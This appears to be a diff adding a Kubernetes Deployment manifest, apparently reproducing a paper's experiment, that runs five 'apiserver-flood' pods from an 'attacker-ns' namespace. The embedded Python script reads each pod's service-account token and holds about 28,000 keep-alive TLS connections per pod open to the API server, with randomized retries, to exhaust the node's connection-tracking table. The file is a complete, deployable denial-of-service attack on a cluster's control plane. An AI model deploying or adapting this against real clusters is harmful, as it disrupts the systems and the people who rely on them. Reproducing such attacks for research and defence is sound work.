@@ -1,0 +1,104 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: apiserver-flood
+  namespace: attacker-ns
+spec:
+  replicas: 5   # 5 malicious containers, matches the paper's Case 2 setup (§4.3)
+  selector:
+    matchLabels:
+      app: apiserver-flood
+  template:
+    metadata:
+      labels:
+        app: apiserver-flood
+    spec:
+      nodeName: k8s-w1
+      containers:
+      - name: flooder
+        image: python:3.12-alpine
+        env:
+        - name: CONNS
+          value: "28000"    # connections held open per pod (131072 / 5 pods ~= 26214)
+        - name: TARGET_IP
+          value: "10.96.0.1"   # kubernetes service ClusterIP, avoids a DNS lookup per connection
+        command: ["/bin/sh", "-c"]
+        args:
+          - |
+            ulimit -n 32000
+            exec python3 -c '
+            import asyncio, ssl, os, random
+
+            TARGET_IP = os.environ["TARGET_IP"]
+            CONNS = int(os.environ["CONNS"])
+            TOKEN_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/token"
+            CA_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
+
+            with open(TOKEN_PATH) as f:
+                TOKEN = f.read().strip()
+
+            ctx = ssl.create_default_context(cafile=CA_PATH)
+            req = (
+                "GET /healthz HTTP/1.1\r\n"
+                "Host: kubernetes.default.svc\r\n"
+                f"Authorization: Bearer {TOKEN}\r\n"
+                "Connection: keep-alive\r\n\r\n"
+            ).encode()
+
+            established = 0
+            errors = {}
+
+            # Each connection is opened once and kept alive (re-pinged with
+            # /healthz) instead of opened and closed in a loop, so it holds
+            # one conntrack entry directly. If it later drops, it retries.
+            # Both the re-ping interval and the retry delay are randomized
+            # to avoid many connections retrying at the same moment.
+            async def hold():
+                global established
+                while True:
+                    connected = False
+                    try:
+                        reader, writer = await asyncio.open_connection(
+                            TARGET_IP, 443, ssl=ctx, server_hostname="kubernetes.default.svc"
+                        )
+                        connected = True
+                        established += 1
+                        while True:
+                            writer.write(req)
+                            await writer.drain()
+                            await reader.read(4096)
+                            await asyncio.sleep(random.uniform(20, 60))
+                    except Exception as e:
+                        key = f"{type(e).__name__}:{str(e)[:40]}"
+                        errors[key] = errors.get(key, 0) + 1
+                        if connected:
+                            established -= 1
+                        await asyncio.sleep(random.uniform(1, 6))
+
+            async def report():
+                while True:
+                    print(f"established={established} errors={dict(list(errors.items())[:3])}", flush=True)
+                    await asyncio.sleep(5)
+
+            async def main():
+                asyncio.create_task(report())
+                await asyncio.gather(*(hold() for _ in range(CONNS)))
+
+            asyncio.run(main())
+            '
+        resources:
+          requests:
+            cpu: "500m"
+            memory: "512Mi"
+          limits:
+            memory: "2Gi"   # no CPU limit
+        securityContext:
+          allowPrivilegeEscalation: false
+          privileged: false
+          readOnlyRootFilesystem: false
+          runAsNonRoot: true
+          runAsUser: 1000
+          seccompProfile:
+            type: RuntimeDefault
+          capabilities:
+            drop: ["ALL"]
